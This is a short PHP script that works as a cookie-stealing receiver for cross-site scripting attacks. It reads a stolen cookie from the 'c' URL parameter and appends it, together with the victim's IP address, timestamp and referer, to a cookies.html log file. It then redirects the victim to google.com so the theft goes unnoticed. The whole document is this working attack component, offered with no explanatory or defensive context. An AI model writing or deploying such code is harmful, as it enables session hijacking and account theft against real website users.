<?php
header ("Location: http://google.com");
$cookie = $_GET['c'];
print_r($cookie);
$ip = getenv ('REMOTE_ADDR');
$date=date("j F, Y, g:i a");;
$referer=getenv ('HTTP_REFERER');
$fp = fopen('cookies.html', 'a');
fwrite($fp, 'Cookie: '.$cookie.'<br> IP: ' .$ip. '<br> Date and Time: ' .$date. '<br> Referer: '.$referer.'<br><br><br>');
fclose($fp);

?>